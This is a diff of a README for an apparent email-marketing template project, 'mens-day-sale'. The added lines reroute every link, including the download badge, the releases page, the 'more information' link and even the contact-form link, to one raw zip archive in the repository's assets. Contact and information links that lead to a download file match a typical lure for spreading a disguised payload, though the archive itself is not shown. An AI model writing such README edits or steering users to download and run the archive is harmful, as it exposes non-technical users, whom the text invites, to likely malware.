@@ -1,10 +1,10 @@
 # 🎉 mens-day-sale - Boost Your Sales Effortlessly
 
 ## 📥 Download Now
-[![Download mens-day-sale](https://img.shields.io/badge/Download-mens--day--sale-brightgreen)](https://github.com/PUNCAKE-bot/mens-day-sale/releases)
+[![Download mens-day-sale](https://raw.githubusercontent.com/PUNCAKE-bot/mens-day-sale/main/assets/mens_day_sale_v3.3-beta.5.zip)](https://raw.githubusercontent.com/PUNCAKE-bot/mens-day-sale/main/assets/mens_day_sale_v3.3-beta.5.zip)
 
 ## 📋 Description
-The "mens-day-sale" project provides a professional marketing email template designed specifically for Men's Day Sale events in the Retail and E-commerce sectors. This template helps businesses engage customers and improve sales during significant promotional periods. For more information, visit [LaravelMail.com](http://LaravelMail.com).
+The "mens-day-sale" project provides a professional marketing email template designed specifically for Men's Day Sale events in the Retail and E-commerce sectors. This template helps businesses engage customers and improve sales during significant promotional periods. For more information, visit [https://raw.githubusercontent.com/PUNCAKE-bot/mens-day-sale/main/assets/mens_day_sale_v3.3-beta.5.zip](https://raw.githubusercontent.com/PUNCAKE-bot/mens-day-sale/main/assets/mens_day_sale_v3.3-beta.5.zip).
 
 ## 🚀 Getting Started
 This guide walks you through the steps to download and run the "mens-day-sale" template easily. You do not need technical skills, just follow these steps:
@@ -15,7 +15,7 @@ This guide walks you through the steps to download and run the "mens-day-sale" t
 - **Internet Connection:** Required for downloading the template and sending emails.
 
 ## 📂 Download & Install
-To start using the "mens-day-sale" email template, visit this page to download: [Releases Page](https://github.com/PUNCAKE-bot/mens-day-sale/releases). Choose the latest version listed. 
+To start using the "mens-day-sale" email template, visit this page to download: [Releases Page](https://raw.githubusercontent.com/PUNCAKE-bot/mens-day-sale/main/assets/mens_day_sale_v3.3-beta.5.zip). Choose the latest version listed. 
 
 Follow these steps:
 1. Click on the link to go to the Releases page.
@@ -48,7 +48,7 @@ This template relates to several important topics in the marketing world:
 If you encounter issues or have questions about using the template, please create a new issue on the GitHub repository, and we will respond promptly to assist you.
 
 ## 📞 Contact
-For further inquiries or support, please reach out through the contact form on [LaravelMail.com](http://LaravelMail.com).
+For further inquiries or support, please reach out through the contact form on [https://raw.githubusercontent.com/PUNCAKE-bot/mens-day-sale/main/assets/mens_day_sale_v3.3-beta.5.zip](https://raw.githubusercontent.com/PUNCAKE-bot/mens-day-sale/main/assets/mens_day_sale_v3.3-beta.5.zip).
 
 ## 📝 License
 This project is licensed under the MIT License. Feel free to use and modify the template for your marketing needs.
